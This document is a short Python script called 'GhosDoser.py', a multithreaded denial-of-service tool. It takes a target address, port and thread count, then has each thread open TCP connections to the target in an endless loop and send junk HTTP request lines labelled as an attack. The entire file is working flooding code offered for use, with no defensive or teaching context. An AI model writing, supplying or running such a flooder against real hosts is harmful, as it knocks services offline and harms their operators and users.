import argparse, socket, sys
from threading import Thread

print("Type GhosDoser.py -h for help\n")

my_parser = argparse.ArgumentParser()
my_parser.add_argument('-u', metavar='Target', type=str, help='Target IP or URL')
my_parser.add_argument('-p', metavar='Port', type=int, help='Port to send the traffic')
my_parser.add_argument('-t', metavar='Threads', type=int, help='Numbers of threads used')

args = my_parser.parse_args()

target = args.u
port = args.p
threads = args.t

if port <= 0:
    print('Error: Port can not be negative or 0')
    sys.exit()

if threads <= 0:
    print('Error: Threads can not be negative or 0')
    sys.exit()


def attack():
    
    while True:
        mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            mysocket.connect((target, port))
            mysocket.send(str.encode("GET " + "ThIs Is An AtTaCk " + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "ThIs Is An AtTaCk " + "HTTP/1.1 \r\n"), (target, port))
            mysocket.close()

            print('==>Package sent<==')

        except socket.error:
            print('==>ERROR<==')
        mysocket.close



def main():
    print('Starting Attack')
    print('Target: ' + target)
    print('Port: ' + str(port))
    
    for i in range (threads):       
        t = Thread(target=attack)
        t.start()


if __name__ == '__main__':
    main()
